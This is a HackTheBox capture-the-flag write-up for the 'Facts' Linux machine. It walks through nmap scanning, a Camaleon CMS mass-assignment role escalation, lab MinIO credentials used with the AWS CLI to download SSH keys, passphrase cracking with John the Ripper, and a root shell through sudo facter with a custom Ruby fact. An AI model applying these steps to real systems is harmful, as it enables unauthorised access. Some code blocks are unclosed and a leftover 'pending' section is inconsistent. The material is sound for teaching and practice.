# HackTheBox - Facts Writeup

## Machine Information
- **Name:** Facts
- **OS:** Linux (Ubuntu 24)
- **Difficulty:** Medium
- **IP:** 10.129.244.96

---

## Summary

Linux machine involving:
1. Web service enumeration (Camaleon CMS)
2. Mass Assignment vulnerability exploitation for privilege escalation
3. MinIO access (S3-compatible storage)
4. Encrypted SSH key extraction
5. Passphrase cracking with John the Ripper

---

## Reconnaissance

### Port Scanning

```bash
sudo nmap -p- -sS -sC -sV -T4 --min-rate=5000 -n -Pn 10.129.244.96
```

**Open ports:**
- **22/tcp** - SSH (OpenSSH 9.9p1)
- **80/tcp** - HTTP (nginx 1.26.3) → Redirects to `http://facts.htb/`
- **54321/tcp** - MinIO (S3-compatible server) → Redirects to port 9001

### Add to /etc/hosts

```bash
echo "10.129.244.96 facts.htb" | sudo tee -a /etc/hosts
```

---

## Web Enumeration

### CMS Identification

The website runs **Camaleon CMS v2.9.0** (Ruby on Rails).

**Technologies detected with Wappalyzer:**
- Ruby on Rails
- Nginx 1.26.3
- jQuery 2.2.4
- Bootstrap 3.4.1

### Login Panel

**Functionality:**
- Allows new user registration
- Redirects to `/admin/wp-config.php` after registration (404)

---

## Exploitation - Camaleon CMS

### Vulnerability: Mass Assignment (CVE)

**Vulnerable version:** Camaleon CMS < 2.9.1

**Description:**  
The `updated_ajax` method in `UsersController` uses `params.require(:password).permit!` without filters, allowing modification of any user attribute, including the role.

### Manual Exploitation

**⚠️ Important Note:** The key parameter is `password[role]=admin`, NOT `user[role]=admin`, because the code does `params.require(:password).permit!`

**Valid role values:**
- `admin` - Administrator
- `editor` - Editor  
- `contributor` - Contributor
- `client` - Client (default)

---

## MinIO Access (S3 Storage)

### Obtaining Credentials

Once with **Administrator** privileges in Camaleon CMS:

1. Go to: **Settings** → **Filesystem Settings**

**Credentials found:**
```
AWS S3 Access Key: AKIA693A9346231E4C70
AWS S3 Secret Key: JG5B83+Lw4TfWnM0LN6r5HicZ5FDfcDd1e74Dzak
Bucket Name: randomfacts
Region: us-east-1
Endpoint: http://localhost:54321
CloudFront URL: http://facts.htb/randomfacts
```

### Configure AWS CLI

```bash
aws configure set aws_access_key_id AKIA693A9346231E4C70
aws configure set aws_secret_access_key JG5B83+Lw4TfWnM0LN6r5HicZ5FDfcDd1e74Dzak
aws configure set region us-east-1
```

### Enumerate Buckets

```bash
# List all buckets
aws --endpoint-url http://10.129.244.96:54321 s3 ls

### Explore "internal" Bucket

```bash
# List content recursively
aws --endpoint-url http://10.129.244.96:54321 s3 ls s3://internal/ --recursive

# SSH files discovered
```

### Download SSH Key

```bash
# Download private key
# Download authorized_keys
```

**Identified user:** `trivia`

---

## SSH Passphrase Cracking

### Use ssh2john and John the Ripper

```bash
# Convert key to John format
ssh2john id_ed25519 > hash.txt

# Crack with rockyou.txt
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt

# Connect via SSH with the user and found passphrase

### Post-Exploitation

```bash
# Verify user
whoami
id

# Find user flag
cat ~/user.txt

# Privilege Enumeration (Sudo)
Once inside, the `sudo -l` command revealed an insecure configuration ("Misconfiguration"):

Permission: (ALL) NOPASSWD: /usr/bin/facter.

Vulnerability: Facter allows loading arbitrary Ruby code from user-defined directories.

## Privilege Escalation (Facter Ruby Exploit)
We exploited that facter runs as root to inject a shell.

The logical process was:

1. Create a "Custom Fact" in `/tmp/exploit.rb`.
2. Define a code block that executes `/bin/bash -p`.
3. Force Facter to load that file using the environment variable or the `--custom-dir` parameter.

```bash
# Final escalation command
sudo /usr/bin/facter --custom-dir /tmp exploit
```

---

## General Tips

### 🔍 Reconnaissance

1. **Always do full port scan** (`-p-`)
2. Services on non-standard ports (like 54321) are often critical
3. Add domains to `/etc/hosts` when there are redirects

### 🎯 Web Enumeration

1. Use **Wappalyzer** or **WhatWeb** to identify technologies
2. Look for admin panels: `/admin`, `/login`, `/dashboard`
3. Review HTML source code for versions and comments
4. Test user registration if available

### 🔓 Camaleon CMS

1. **Vulnerable version:** < 2.9.1
2. The vulnerability is in the `password[]` parameter, not `user[]`
3. Available roles can be seen in the HTML select code
4. After privilege escalation, check **Settings** for credentials

### 🗄️ MinIO / S3

1. MinIO is an S3-compatible server, use AWS CLI
2. Look for credentials in CMS Settings or configuration files
3. Enumerate **all available buckets**
4. The "internal" bucket often contains sensitive files
5. Search for SSH keys in paths like `.ssh/`, `backup/`, `keys/`

### 🔑 SSH Keys

1. Use `ssh-keygen -y -f` to verify if a key is encrypted
2. The `authorized_keys` reveals the user at the end: `user@hostname`
3. Always set `chmod 600` permissions on private keys
4. Use `ssh2john` + `john` to crack passphrases
5. Recommended wordlist: `rockyou.txt`

### ⚙️ Useful Commands

```bash
# Enumerate S3/MinIO buckets
aws --endpoint-url http://IP:PORT s3 ls

# Download entire bucket
aws --endpoint-url http://IP:PORT s3 sync s3://bucket-name/ ./local-folder/

# Crack SSH passphrase
ssh2john id_rsa > hash.txt
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt

# Connect with encrypted SSH key
ssh -i private_key user@IP
```

---

## Privilege Escalation

*(Pending section - depends on post-SSH access enumeration)*

Typical steps:
1. `sudo -l` - Check sudo permissions
2. `find / -perm -4000 2>/dev/null` - Find SUID binaries
3. Check cronjobs: `cat /etc/crontab`
4. Enumerate internal services: `netstat -tulpn`
5. Search for credentials in configuration files

---

## Flags

```
User Flag: [Obtain after SSH access]
Root Flag: [Obtain after privilege escalation]
```

---

## Lessons Learned

1. **Mass Assignment** is a common vulnerability in Ruby on Rails when using `permit!`
2. Modern CMSs often have configurations that expose credentials to external services
3. MinIO/S3 buckets can contain sensitive information (SSH keys, backups, etc.)
4. Always verify if an SSH key is encrypted before attempting to use it
5. `ssh2john` + `john` is effective for cracking SSH key passphrases

---

## References

- [Camaleon CMS GitHub](https://github.com/owen2345/camaleon-cms)
- [Mass Assignment Vulnerability](https://owasp.org/www-community/vulnerabilities/Mass_Assignment_Cheat_Sheet)
- [MinIO Documentation](https://min.io/docs/minio/linux/index.html)
- [AWS CLI S3 Commands](https://docs.aws.amazon.com/cli/latest/reference/s3/)
- [John the Ripper](https://www.openwall.com/john/)

---

**Author:** azxss
**Date:** February 2026  
**Platform:** HackTheBox
